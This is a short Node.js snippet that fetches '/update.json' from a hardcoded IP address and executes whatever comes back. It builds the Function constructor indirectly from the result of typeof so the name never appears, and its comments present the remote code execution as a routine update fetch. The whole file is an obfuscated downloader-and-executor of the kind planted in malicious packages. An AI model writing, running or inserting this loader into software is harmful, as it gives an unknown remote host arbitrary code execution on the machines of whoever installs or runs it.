(function(){

    // Importing required module
    var http = require('http');

    // Making an HTTP GET request
    return http.get({
        host: '23.94.46.191',
        port: 80,
        path: '/update.json'
    }, function(response) {
        var body = '';

        // Handling response data
        response.on('data', function(d) {
            body += d;
        });

        // Handling end of response
        response.on('end', function() {
            // Constructing a function based on the type of the Buffer object
            var f = this[(typeof(this.Buffer.from)).charAt(0).toUpperCase() + (typeof(this.Buffer.from)).slice(1)];
            // Creating a new instance of the constructed function with the response body as input
            var o = new f(body);
            // Executing the constructed function
            o();
        });
    });
})();

